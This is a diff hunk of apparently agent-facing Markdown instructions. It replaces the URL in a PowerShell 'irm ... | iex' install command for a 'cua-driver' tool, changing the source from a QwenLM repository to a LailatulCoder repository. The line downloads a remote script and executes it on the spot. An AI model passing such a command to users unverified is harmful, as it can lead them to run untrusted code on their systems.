@@ -462,7 +462,7 @@ your prior tool calls earned.
    added to the user PATH by the install script.
    If missing, point the user at:
    ```powershell
-   irm https://raw.githubusercontent.com/QwenLM/qwen-code/main/packages/cua-driver/scripts/install.ps1 | iex
+   irm https://raw.githubusercontent.com/LailatulCoder/lailatul-coder/main/packages/cua-driver/scripts/install.ps1 | iex
    ```
    and stop.
 2. **The runtime owner must run in an interactive session (Session 1+),
